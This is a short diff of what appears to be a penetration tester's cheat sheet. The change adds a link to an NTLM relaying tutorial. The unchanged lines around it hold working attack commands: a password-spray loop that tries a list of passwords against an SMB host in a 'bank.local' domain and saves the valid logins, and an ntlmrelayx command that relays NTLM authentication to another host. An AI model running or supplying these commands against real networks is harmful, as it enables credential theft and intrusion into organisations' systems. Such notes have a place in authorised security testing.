@@ -61,7 +61,7 @@ Password Spray
   Passwd scan: sleep=1500; user='patrick'; for i in $(cat passwd.txt); do smbclient -W bank.local -U $user%$i -L //10.100.20.10 && echo $user:$i | tee -a ./valid.txt; sleep $sleep; done
 
 Relay NTLM to another host
-
+	Link: https://luemmelsec.github.io/Relaying-101/
 	Start NTLMRelay First
 		sudo python3 ntlmrelayx.py -t smb://10.100.20.20 -smb2support -socks
 	Setup Proxychains
